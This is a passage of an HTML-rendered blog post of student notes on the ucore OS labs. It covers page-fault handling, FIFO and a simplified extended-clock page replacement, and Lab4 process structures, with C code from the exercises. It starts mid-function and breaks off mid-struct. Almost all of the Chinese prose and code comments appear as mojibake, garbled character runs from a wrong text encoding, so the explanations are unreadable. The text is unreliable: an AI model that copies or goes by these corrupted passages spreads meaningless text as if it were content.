(pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="hljs-literal">NULL</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* LAB3 EXERCISE 2: YOUR CODE */</span><br>        <span class="hljs-comment">// å¦‚æœè¿™ä¸ªé¡µè¡¨é¡¹æ‰€å¯¹åº”çš„ç‰©ç†é¡µå­˜åœ¨ï¼Œä½†ä¸åœ¨å†…å­˜ä¸­</span><br>        <span class="hljs-comment">// å¦‚æœswapå·²ç»åˆå§‹åŒ–å®Œæˆ</span><br>        <span class="hljs-keyword">if</span>(swap_init_ok) &#123;<br>            struct Page *page=<span class="hljs-literal">NULL</span>;<br>            <span class="hljs-comment">// å°†ç›®æ ‡æ•°æ®åŠ è½½åˆ°æŸå—æ–°çš„ç‰©ç†é¡µä¸­ã€‚</span><br>            <span class="hljs-comment">// è¯¥ç‰©ç†é¡µå¯èƒ½æ˜¯å°šæœªåˆ†é…çš„ç‰©ç†é¡µï¼Œä¹Ÿå¯èƒ½æ˜¯ä»åˆ«çš„å·²åˆ†é…ç‰©ç†é¡µä¸­å–çš„</span><br>            <span class="hljs-keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="hljs-number">0</span>) &#123;<br>                cprintf(<span class="hljs-string">&quot;swap_in in do_pgfault failed\n&quot;</span>);<br>                <span class="hljs-keyword">goto</span> failed;<br>            &#125;<br>            <span class="hljs-comment">// å°†è¯¥ç‰©ç†é¡µä¸å¯¹åº”çš„è™šæ‹Ÿåœ°å€å…³è”ï¼ŒåŒæ—¶è®¾ç½®é¡µè¡¨ã€‚</span><br>            page_insert(mm-&gt;pgdir, page, addr, perm);<br>            <span class="hljs-comment">// å½“å‰ç¼ºå¤±çš„é¡µå·²ç»åŠ è½½å›å†…å­˜ä¸­ï¼Œæ‰€ä»¥è®¾ç½®å½“å‰é¡µä¸ºå¯swapã€‚</span><br>            swap_map_swappable(mm, addr, page, <span class="hljs-number">1</span>);<br>            page-&gt;pra_vaddr = addr;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            cprintf(<span class="hljs-string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>   &#125;<br>   ret = <span class="hljs-number">0</span>;<br>failed:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>å…³äº<code>get_pte()Â andÂ page_remove_pte()Â vs.Â page_inseret()</code>å›é¡¾: <ul><li>get pte and return the kernel virtual address of this pte for la, and if the PT contianing this pte didnâ€™t exist, alloc a page for PT</li><li>pageçš„æ’å…¥å’Œåˆ é™¤æ„å‘³ç€pageç»“æ„çš„refå¢å‡ä»¥åŠpteçš„å­˜åœ¨ä¸å¦, è€Œå®éªŒä¸ºäº†å¼„å‡ºä¸€ä¸ªç»ƒä¹ , åœ¨<code>page_remove()</code>ä¸­åˆ¤æ–­pteä¸ä¸ºç©ºåè°ƒç”¨<code>page_remove_pte()</code>, ref_dec and clear pte.</li></ul></li></ul><hr><ul><li>è¯·æè¿°é¡µç›®å½•é¡¹ï¼ˆPage Directory Entryï¼‰å’Œé¡µè¡¨é¡¹ï¼ˆPage Table Entryï¼‰ä¸­ç»„æˆéƒ¨åˆ†å¯¹ucoreå®ç°é¡µæ›¿æ¢ç®—æ³•çš„æ½œåœ¨ç”¨å¤„ã€‚<ul><li>å³PTEç»“æ„ä¸å…¶æ ‡å¿—ä½ç”¨é€”</li></ul></li><li>å¦‚æœucoreçš„ç¼ºé¡µæœåŠ¡ä¾‹ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è®¿é—®å†…å­˜ï¼Œå‡ºç°äº†é¡µè®¿é—®å¼‚å¸¸ï¼Œè¯·é—®ç¡¬ä»¶è¦åšå“ªäº›äº‹æƒ…ï¼Ÿ<ul><li>å°†å‘ç”Ÿé”™è¯¯çš„çº¿æ€§åœ°å€ï¼ˆè™šæ‹Ÿåœ°å€ï¼‰ä¿å­˜è‡³CR2å¯„å­˜å™¨ä¸­ã€‚</li><li>å‹å…¥<code>EFLAGS</code>ï¼Œ<code>CS</code>, <code>EIP</code>ï¼Œé”™è¯¯ç å’Œä¸­æ–­å·è‡³å½“å‰å†…æ ¸æ ˆä¸­ã€‚</li><li>ä¿å­˜ä¸Šä¸‹æ–‡ã€‚</li><li>æ‰§è¡Œæ–°çš„ç¼ºé¡µä¸­æ–­ç¨‹åºã€‚</li><li>æ¢å¤ä¸Šä¸‹æ–‡ã€‚</li><li>ç»§ç»­æ‰§è¡Œ<strong>ä¸Šä¸€çº§</strong>çš„ç¼ºé¡µæœåŠ¡ä¾‹ç¨‹ã€‚</li></ul></li></ul><h3 id="ç»ƒä¹ 2"><a href="#ç»ƒä¹ 2" class="headerlink" title="ç»ƒä¹ 2"></a>ç»ƒä¹ 2</h3><blockquote><p><strong>è¡¥å……å®ŒæˆåŸºäºFIFOçš„é¡µé¢æ›¿æ¢ç®—æ³•</strong></p><p>å®Œæˆvmm.cä¸­çš„do_pgfaultå‡½æ•°ï¼Œå¹¶ä¸”åœ¨å®ç°FIFOç®—æ³•çš„swap_fifo.cä¸­å®Œæˆmap_swappableå’Œswap_out_victimå‡½æ•°ã€‚</p></blockquote><ul><li><p><code>FIFO</code>ä¸­ï¼Œå½“æ–°åŠ å…¥ä¸€ä¸ªç‰©ç†é¡µæ—¶ï¼Œæˆ‘ä»¬åªéœ€å°†è¯¥ç‰©ç†é¡µåŠ å…¥è‡³é“¾è¡¨é¦–éƒ¨å³å¯ã€‚å½“éœ€è¦æ¢å‡ºæŸä¸ªç‰©ç†é¡µæ—¶ï¼Œé€‰æ‹©é“¾è¡¨æœ«å°¾çš„ç‰©ç†é¡µå³å¯ã€‚</p></li><li><p>ç›¸å…³å®ç°å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_fifo_map_swappable(struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr, struct Page   *page, <span class="hljs-keyword">int</span> swap_in)<br>&#123;<br>    <span class="hljs-keyword">list_entry_t</span> *head=(<span class="hljs-keyword">list_entry_t</span>*) mm-&gt;sm_priv;<br>    <span class="hljs-keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);<br><br>    assert(entry != <span class="hljs-literal">NULL</span> &amp;&amp; head != <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//record the page access situlation</span><br>    <span class="hljs-comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span><br>    <span class="hljs-comment">//(1)link the most recent arrival page at the back of the pra_list_head qeueue.</span><br>    list_add_before(head, entry);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="hljs-keyword">int</span> in_tick)<br>&#123;<br>     <span class="hljs-keyword">list_entry_t</span> *head=(<span class="hljs-keyword">list_entry_t</span>*) mm-&gt;sm_priv;<br>         assert(head != <span class="hljs-literal">NULL</span>);<br>     assert(in_tick==<span class="hljs-number">0</span>);<br>     <span class="hljs-comment">/* Select the victim */</span><br>     <span class="hljs-comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span><br>     <span class="hljs-comment">//(1)  unlink the  earliest arrival page in front of pra_list_head qeueue</span><br>     <span class="hljs-comment">//(2)  assign the value of *ptr_page to the addr of this page</span><br>     <span class="hljs-keyword">list_entry_t</span> *le = head-&gt;prev;<br>     assert(head!=le);<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> le2page(le, pra_page_link);<br>     list_del(le);<br>     assert(p !=<span class="hljs-literal">NULL</span>);<br>     *ptr_page = p;<br><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>å¦‚æœè¦åœ¨ucoreä¸Šå®ç°â€extended clocké¡µæ›¿æ¢ç®—æ³•â€è¯·ç»™ä½ çš„è®¾è®¡æ–¹æ¡ˆï¼Œç°æœ‰çš„swap_manageræ¡†æ¶æ˜¯å¦è¶³ä»¥æ”¯æŒåœ¨ucoreä¸­å®ç°æ­¤ç®—æ³•ï¼Ÿå¦‚æœæ˜¯ï¼Œè¯·ç»™ä½ çš„è®¾è®¡æ–¹æ¡ˆã€‚å¦‚æœä¸æ˜¯ï¼Œè¯·ç»™å‡ºä½ çš„æ–°çš„æ‰©å±•å’ŒåŸºæ­¤æ‰©å±•çš„è®¾è®¡æ–¹æ¡ˆã€‚å¹¶éœ€è¦å›ç­”å¦‚ä¸‹é—®é¢˜</p><ul><li>ç°æœ‰çš„swap_manageræ¡†æ¶å¯ä»¥æ”¯æŒåœ¨ucoreä¸­å®ç°æ­¤ç®—æ³•ï¼Œå…·ä½“è§<strong>æ‰©å±•ç»ƒä¹ 1</strong>ã€‚</li><li>éœ€è¦è¢«æ¢å‡ºçš„é¡µçš„ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿ<ul><li><code>PTE_P</code>(Present)å’Œ<code>PTE_D</code>(Dirty)ä½å‡ä¸º0ã€‚</li></ul></li><li>åœ¨ucoreä¸­å¦‚ä½•åˆ¤æ–­å…·æœ‰è¿™æ ·ç‰¹å¾çš„é¡µï¼Ÿ<ul><li>è·å–çº¿æ€§åœ°å€æ‰€å¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œä¹‹åä½¿ç”¨ä½è¿ç®—åˆ¤æ–­<code>PTE_P</code>å’Œ<code>PTE_D</code>ã€‚</li></ul></li><li>ä½•æ—¶è¿›è¡Œæ¢å…¥å’Œæ¢å‡ºæ“ä½œï¼Ÿ<ul><li>ç¼ºé¡µæ—¶æ¢å…¥ã€‚</li><li>ç‰©ç†é¡µå¸§æ»¡æ—¶æ¢å‡ºï¼Œä¸è¿‡éœ€è¦æ³¨æ„dirty bitçš„å¤„ç†ã€‚å¯ä»¥åœ¨ä¿®æ”¹dirtyçš„æ—¶å€™å†™å…¥å¤–å­˜ï¼Œæˆ–è€…å¯ä»¥åœ¨æœ€ç»ˆè¦åˆ é™¤è¯¥ç‰©ç†é¡µæ—¶å†å†™å…¥å¤–å­˜ã€‚åè€…æœ‰åˆ©äºå¤šä¸ªå†™æ“ä½œçš„åˆå¹¶ï¼Œé™ä½ç¼ºé¡µä»£ä»·ï¼Œä½†æ­¤æ—¶çš„é¡µæ›¿æ¢ç®—æ³•å´é€€åŒ–æˆæ™®é€šçš„clockç®—æ³•ï¼Œè€Œä¸æ˜¯extended clockç®—æ³•äº†ã€‚</li></ul></li></ul></li></ul><h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><ul><li><p>éœ€è¦æ³¨æ„çš„æ˜¯extended clockç®—æ³•ä¼šä¿®æ”¹dirty bit, ä½†æ˜¯swap.cä¸­çš„swap_out()å‡½æ•°ç›´æ¥æŠŠ<code>_fifo_swap_out_victim()</code>é€šè¿‡å‚æ•°è¿”å›çš„pageå†™å…¥åˆ°ç£ç›˜swapåˆ†åŒºä¸­, <strong>æ ¹æœ¬ä¸ç®¡æœ‰æ²¡æœ‰ä¿®æ”¹è¿‡</strong>, æˆ–è®¸å¯ä»¥æ”¹è¿›</p></li><li><p>æ”¹è¿›çš„æ—¶é’Ÿç®—æ³•ä¼šä¿®æ”¹dirty bitçš„åŸå› å¯èƒ½æ˜¯è®©è¢«ä¿®æ”¹è¿‡çš„é¡µé¢åœç•™åœ¨å†…å­˜ä¸­çš„æ—¶é—´æ›´é•¿, å› ä¸ºè¦ç»è¿‡æ›´å¤šæ¬¡çš„éå†æ‰èƒ½è¢«ç½®æ¢å‡º</p></li><li><p>æˆ‘å¯»æ€æŠŠPTE_D and PTE_Aç»“åˆèµ·æ¥éå†åˆ°äº†å°±å‡ä¸€ä¹Ÿæ²¡å•¥ç‰¹åˆ«çš„, è€Œä¸”ä¸‹ä¸€æ¬¡è¿›å…¥é”™è¯¯å¤„ç†ä¾‹ç¨‹æŒ‡é’ˆè¿˜æ˜¯æŒ‰ç…§ä¸Šæ¬¡çš„æ¥ç€ç»§ç»­(å¦‚æœä¸¥æ ¼æŒ‰ç…§PPTä¸Šçš„è¯), æŒ‰åˆ«äººçš„åšæ³•è¿˜è¦éå†ä¸‰æ¬¡å½“å‰swappableçš„é¡µé¢, éå†ä¸€æ¬¡è®°å½•ç¬¬ä¸€æ¬¡é‡åˆ°çš„00,10,11ä¸å°±æˆäº†, å‡å°‘ä¸€ç‚¹å¾®ä¸è¶³é“çš„å†™å›æ—¶é—´(å¥½åƒæ²¡æœ‰</p></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_extend_clock_swap_out_victim(struct mm_struct *mm, struct Page **ptr_page, <span class="hljs-keyword">int</span> in_tick)<br>&#123;<br>    <span class="hljs-keyword">list_entry_t</span> *head = (<span class="hljs-keyword">list_entry_t</span> *)mm-&gt;sm_priv;<br>    assert(head != <span class="hljs-literal">NULL</span>);<br>    assert(in_tick == <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//åœ¨headåŒå‘é“¾è¡¨ä¸­ä»å¤´å¼€å§‹éå†, ä¸¤ä¸ªæ•°å­—ä»£è¡¨PTE_A PTE_Dç»„æˆä¸¤ä½çš„æ ·å­</span><br>    <span class="hljs-comment">//ç”¨ä¸‰ä¸ªæŒ‡é’ˆå–ç¬¬ä¸€æ¬¡éå†åˆ°çš„page, 00ä¼˜å…ˆçº§æœ€é«˜</span><br>    <span class="hljs-keyword">list_entry_t</span> *le = head-&gt;next, *_00 = <span class="hljs-literal">NULL</span>, *_10 = <span class="hljs-literal">NULL</span>, *_11 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (le != head)<br>    &#123;<span class="hljs-comment">//åªéœ€éå†ä¸€æ¬¡</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> le2page(le, pra_page_link); <span class="hljs-comment">//å­—é¢æ„æ€</span><br><br>        <span class="hljs-keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, page-&gt;pra_vaddr, <span class="hljs-number">0</span>);<br>        assert(ptep != <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//å†™ç€æ„æ€ä¸€ä¸‹, ä¹Ÿä¸çŸ¥æœ‰å•¥ç”¨</span><br>        <span class="hljs-keyword">if</span> (!(*ptep &amp; PTE_A))<br>        &#123;<span class="hljs-comment">//é‡åˆ°ç¬¬ä¸€ä¸ª00å°±å¯ä»¥ç›´æ¥breakäº†, å—å®³è€…å°±æ˜¯ä½ !</span><br>            _00 = le;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<span class="hljs-comment">//å‰©ä¸‹ä¸¤ç§æƒ…å†µä¸èƒ½break(ä¸ºäº†ä¸å†™çš„æ›´å¤æ‚</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(*ptep &amp; PTE_D) &amp;&amp; _10 == <span class="hljs-literal">NULL</span>)<br>            _10 = le;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_11 == <span class="hljs-literal">NULL</span>)<br>            _11 = le;<br>        le = le-&gt;next;<br>    &#125;<br>    le = _00 != <span class="hljs-literal">NULL</span> ? _00 : (_10 != <span class="hljs-literal">NULL</span> ? _10 : _11);<span class="hljs-comment">//æ ¹æ®ä¼˜å…ˆçº§é€‰ä¸€ä¸ªä¸ä¸ºé›¶çš„</span><br>    *ptr_page = le2page(le, pra_page_link);<span class="hljs-comment">//æŠŠå—å®³è€…çš„pageèµ‹å€¼ç»™è¿™ä¸œè¥¿</span><br>    list_del(le);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æˆäº†, ç®€åŒ–äº†ä¸€ä¸‹æ²¡æœ‰ä»€ä¹ˆç”¨çš„æ”¹è¿›æ—¶é’Ÿç®—æ³•, åªè¦ä¸€æ¬¡ç”šè‡³ä¸ç”¨å®Œå…¨çš„ä¸€æ¬¡éå†å³å¯åšåˆ°ç›¸åŒæ•ˆæœ, è¿˜é€šè¿‡äº†fifoçš„æ£€æŸ¥, æœ‰è¿™ä¹ˆå·§å—</p><blockquote><p>æƒ³äº†ä¸€ä¸‹, æˆ‘è¿™å¿«ç®€åŒ–æˆFIFOäº†, è€Œæ”¹è¿›çš„æ—¶é’Ÿç½®æ¢ç®—æ³•çš„ä¼˜åŠ¿åœ¨äº<strong>ç›¸è¿‘çš„</strong>å¤šæ¬¡éå†ä¹‹ä¸­, è¢«å†™è¿‡çš„é¡µé¢å¯ä»¥åœ¨å†…å­˜ä¸­é©»ç•™æ›´ä¹…çš„æ—¶é—´</p><p>å‘ä¸å¡«äº†, é—®é¢˜å°±æ˜¯è¿™ä¸ªæ„æ€æ²¡æœ‰å¾ˆå¤æ‚</p></blockquote><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><p>æš‚æ—¶ä¸å†™</p><h1 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h1><h2 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="0-é¡¹ç›®ç»„æˆ-1"><a href="#0-é¡¹ç›®ç»„æˆ-1" class="headerlink" title="0.é¡¹ç›®ç»„æˆ"></a>0.é¡¹ç›®ç»„æˆ</h3><p>ç›¸å¯¹ä¸å®éªŒä¸‰ï¼Œå®éªŒå››ä¸­ä¸»è¦æ”¹åŠ¨å¦‚ä¸‹ï¼š</p><ul><li>kern/process/ ï¼ˆæ–°å¢è¿›ç¨‹ç®¡ç†ç›¸å…³æ–‡ä»¶ï¼‰<ul><li>proc.[ch]ï¼šæ–°å¢ï¼šå®ç°è¿›ç¨‹ã€çº¿ç¨‹ç›¸å…³åŠŸèƒ½ï¼ŒåŒ…æ‹¬ï¼šåˆ›å»ºè¿›ç¨‹/çº¿ç¨‹ï¼Œåˆå§‹åŒ–è¿›ç¨‹/çº¿ç¨‹ï¼Œå¤„ç†è¿›ç¨‹/çº¿ç¨‹é€€å‡ºç­‰åŠŸèƒ½</li><li>entry.Sï¼šæ–°å¢ï¼šå†…æ ¸çº¿ç¨‹å…¥å£å‡½æ•°kernel_thread_entryçš„å®ç°</li><li>switch.Sï¼šæ–°å¢ï¼šä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œåˆ©ç”¨å †æ ˆä¿å­˜ã€æ¢å¤è¿›ç¨‹ä¸Šä¸‹æ–‡</li></ul></li><li>kern/init/<ul><li>init.cï¼šä¿®æ”¹ï¼šå®Œæˆè¿›ç¨‹ç³»ç»Ÿåˆå§‹åŒ–ï¼Œå¹¶åœ¨å†…æ ¸åˆå§‹åŒ–ååˆ‡å…¥idleè¿›ç¨‹</li></ul></li><li>kern/mm/ ï¼ˆåŸºæœ¬ä¸Šä¸æœ¬æ¬¡å®éªŒæ²¡æœ‰å¤ªç›´æ¥çš„è”ç³»ï¼Œäº†è§£kmallocå’Œkfreeå¦‚ä½•ä½¿ç”¨å³å¯ï¼‰<ul><li>kmalloc.[ch]ï¼šæ–°å¢ï¼šå®šä¹‰å’Œå®ç°äº†æ–°çš„kmalloc/kfreeå‡½æ•°ã€‚å…·ä½“å®ç°æ˜¯åŸºäºslabåˆ†é…çš„ç®€åŒ–ç®—æ³• ï¼ˆåªè¦æ±‚ä¼šè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°å³å¯ï¼‰</li><li>memlayout.hï¼šå¢åŠ slabç‰©ç†å†…å­˜åˆ†é…ç›¸å…³çš„å®šä¹‰ä¸å® ï¼ˆå¯ä¸ç”¨ç†ä¼šï¼‰ã€‚</li><li>pmm.[ch]ï¼šä¿®æ”¹ï¼šåœ¨pmm.cä¸­æ·»åŠ äº†è°ƒç”¨kmalloc_initå‡½æ•°,å–æ¶ˆäº†è€çš„kmalloc/kfreeçš„å®ç°ï¼›åœ¨pmm.hä¸­å–æ¶ˆäº†è€çš„kmalloc/kfreeçš„å®šä¹‰</li><li>swap.cï¼šä¿®æ”¹ï¼šå–æ¶ˆäº†ç”¨äºcheckçš„Line 185çš„æ‰§è¡Œ</li><li>vmm.cï¼šä¿®æ”¹ï¼šè°ƒç”¨æ–°çš„kmalloc/kfree</li></ul></li><li>kern/trap/<ul><li>trapentry.Sï¼šå¢åŠ äº†æ±‡ç¼–å†™çš„å‡½æ•°forkretsï¼Œç”¨äºdo_forkè°ƒç”¨çš„è¿”å›å¤„ç†ã€‚</li></ul></li><li>kern/schedule/<ul><li>sched.[ch]ï¼šæ–°å¢ï¼šå®ç°FIFOç­–ç•¥çš„è¿›ç¨‹è°ƒåº¦</li></ul></li><li>kern/libs<ul><li>rb_tree.[ch]ï¼šæ–°å¢ï¼šå®ç°çº¢é»‘æ ‘ï¼Œè¢«slabåˆ†é…çš„ç®€åŒ–ç®—æ³•ä½¿ç”¨ï¼ˆå¯ä¸ç”¨ç†ä¼šï¼‰</li></ul></li></ul><h3 id="1-é‡è¦æ•°æ®ç»“æ„-link"><a href="#1-é‡è¦æ•°æ®ç»“æ„-link" class="headerlink" title="1.é‡è¦æ•°æ®ç»“æ„[link]"></a>1.é‡è¦æ•°æ®ç»“æ„<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab4/lab4_3_2_pcb.html">[link]</a></h3><blockquote><p>è¿™æ¬¡çš„<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab4/lab4_3_1_lab_steps.html">å®éªŒæŒ‡å¯¼ä¹¦</a>çœŸç», å†™çš„æ˜¯æ²¡æ³•æ¯”é‚£ä¸ªå¥½äº†, å°±å†™ç‚¹è‡ªå·±é¢†æ‚Ÿåˆ°çš„æµç¨‹å§</p></blockquote><p>ä¸ºäº†ç®¡ç†ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹æ§åˆ¶å—ï¼ŒuCoreç»´æŠ¤äº†å¦‚ä¸‹å…¨å±€å˜é‡ï¼ˆä½äº<em>kern/process/proc.c</em>ï¼‰ï¼š</p><ul><li><code>static struct proc *current</code>ï¼šå½“å‰å ç”¨CPUä¸”å¤„äºâ€œè¿è¡Œâ€çŠ¶æ€è¿›ç¨‹æ§åˆ¶å—æŒ‡é’ˆã€‚é€šå¸¸è¿™ä¸ªå˜é‡æ˜¯åªè¯»çš„ï¼Œåªæœ‰åœ¨è¿›ç¨‹åˆ‡æ¢çš„æ—¶å€™æ‰è¿›è¡Œä¿®æ”¹ï¼Œå¹¶ä¸”æ•´ä¸ªåˆ‡æ¢å’Œä¿®æ”¹è¿‡ç¨‹éœ€è¦ä¿è¯æ“ä½œçš„åŸå­æ€§ï¼Œç›®å‰è‡³å°‘éœ€è¦å±è”½ä¸­æ–­ã€‚å¯ä»¥å‚è€ƒ switch_to çš„å®ç°ã€‚</li><li><code>static struct proc *initproc</code>ï¼šæœ¬å®éªŒä¸­ï¼ŒæŒ‡å‘ä¸€ä¸ªå†…æ ¸çº¿ç¨‹ã€‚æœ¬å®éªŒä»¥åï¼Œæ­¤æŒ‡é’ˆå°†æŒ‡å‘ç¬¬ä¸€ä¸ªç”¨æˆ·æ€è¿›ç¨‹ã€‚</li><li><code>static list_entry_t hash_list[HASH_LIST_SIZE]</code>ï¼šæ‰€æœ‰è¿›ç¨‹æ§åˆ¶å—çš„å“ˆå¸Œè¡¨ï¼Œproc_structä¸­çš„æˆå‘˜å˜é‡hash_linkå°†åŸºäºpidé“¾æ¥å…¥è¿™ä¸ªå“ˆå¸Œè¡¨ä¸­ã€‚</li><li><code>list_entry_t proc_list</code>ï¼šæ‰€æœ‰è¿›ç¨‹æ§åˆ¶å—çš„åŒå‘çº¿æ€§åˆ—è¡¨ï¼Œproc_structä¸­çš„æˆå‘˜å˜é‡list_linkå°†é“¾æ¥å…¥è¿™ä¸ªé“¾è¡¨ä¸­ã€‚</li></ul><p>PCBå¥½åƒæœ‰æ‰€ç®€åŒ–:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> &#123;</span><br>    PROC_UNINIT = <span class="hljs-number">0</span>,  <span class="hljs-comment">// æœªåˆå§‹åŒ–çš„     -- alloc_proc</span><br>    PROC_SLEEPING,    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€       -- try_free_pages, do_wait, do_sleep</span><br>    PROC_RUNNABLE,    <span class="hljs-comment">// å°±ç»ª/è¿è¡ŒçŠ¶æ€   -- proc_init, wakeup_proc,</span><br>    PROC_ZOMBIE,      <span class="hljs-comment">// åƒµæ­»çŠ¶æ€       -- do_exit</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> &#123;</span>  <span class="hljs-comment">// ä¿å­˜çš„ä¸Šä¸‹æ–‡å¯„å­˜å™¨ï¼Œæ³¨æ„æ²¡æœ‰eaxå¯„å­˜å™¨å’Œæ®µå¯„å­˜å™¨</span><br>    <span class="hljs-keyword">uint32_t</span> eip;<br>    <span class="hljs-keyword">uint32_t</span> esp;<br>    <span class="hljs-keyword">uint32_t</span> ebx;<br>    <span class="hljs-keyword">uint32_t</span> ecx;<br>    <span class="hljs-keyword">uint32_t</span> edx;<br>    <span class="hljs-keyword">uint32_t</span> esi;<br>    <span class="hljs-keyword">uint32_t</span> edi;<br>    <span class="hljs-keyword">uint32_t</span> ebp;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> <span class="hljs-title">state</span>;</span>          <span class="hljs-comment">// å½“å‰è¿›ç¨‹çš„çŠ¶æ€</span><br>    <span class="hljs-keyword">int</span> pid;                        <span class="hljs-comment">// è¿›ç¨‹ID</span><br>    <span class="hljs-keyword">int</span> runs;                       <span class="hljs-comment">// å½“å‰è¿›ç¨‹è¢«è°ƒåº¦çš„æ¬¡æ•°</span><br>    <span class="hljs-keyword">uintptr_t</span> kstack;               <span class="hljs-comment">// å†…æ ¸æ ˆ</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">bool</span> need_resched;     <span class="hljs-comment">// æ˜¯å¦éœ€è¦è¢«è°ƒåº¦</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">parent</span>;</span>     <span class="hljs-comment">// çˆ¶è¿›ç¨‹ID</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span 